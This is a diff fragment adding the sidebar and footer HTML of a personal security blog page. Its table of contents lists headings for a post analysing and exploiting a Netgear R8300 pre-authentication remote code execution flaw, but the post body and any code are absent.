+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Netgear-R8300认证前RCE的漏洞分析及利用"><span class="nav-number">1.</span> <span class="nav-text">Netgear R8300认证前RCE的漏洞分析及利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#准备"><span class="nav-number">1.1.</span> <span class="nav-text">准备</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#qemu虚拟机"><span class="nav-number">1.2.</span> <span class="nav-text">qemu虚拟机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#模拟运行"><span class="nav-number">1.3.</span> <span class="nav-text">模拟运行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞分析"><span class="nav-number">1.4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">1.5.</span> <span class="nav-text">漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSD"><span class="nav-number">1.6.</span> <span class="nav-text">SSD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文章内容"><span class="nav-number">1.6.1.</span> <span class="nav-text">文章内容</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp注解"><span class="nav-number">1.6.2.</span> <span class="nav-text">exp注解</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gdb调试"><span class="nav-number">1.6.3.</span> <span class="nav-text">gdb调试</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#其他"><span class="nav-number">1.6.4.</span> <span class="nav-text">其他</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fenix"><span class="nav-number">1.7.</span> <span class="nav-text">fenix</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cq"><span class="nav-number">1.8.</span> <span class="nav-text">cq</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#补丁分析"><span class="nav-number">1.9.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他-1"><span class="nav-number">1.10.</span> <span class="nav-text">其他</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="21Guns" src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">21Guns</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">164</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">71</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="vx:lxllxllx1" title="Wechat → vx:lxllxllx1" rel="noopener" target="_blank"><i class="fab fa-weixin fa-fw"></i>Wechat</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://github.com/21Gun5" title="GitHub → https://github.com/21Gun5" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">21Guns</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script size="300" alpha="0.5" zindex="0" src="/lib/canvas-ribbon/canvas-ribbon.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+  <script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
